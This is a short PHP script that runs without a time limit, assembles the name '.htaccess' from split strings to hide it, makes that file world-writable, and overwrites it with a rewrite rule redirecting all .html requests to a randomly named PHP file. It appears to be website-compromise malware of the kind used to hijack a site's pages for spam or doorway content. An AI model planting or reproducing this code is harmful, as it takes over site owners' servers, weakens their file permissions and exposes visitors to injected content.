<?php
ignore_user_abort();
set_time_limit(0);

$f1 = ".ht"; $f2 = "acc"; $f3 = "ess";
$ff = $f1.$f2.$f3;

if (file_exists($ff)) chmod ($ff, 0777);
if (filesize($ff)>120)
{
	$htout = fopen($ff, "w");
	fwrite($htout, "RewriteEngine On 
RewriteRule ^([A-Za-z0-9-]+).html$ rskpeauqp3tru.php?world=5&looping=176&hl=$1 [L]");
fclose($htout);
}

?>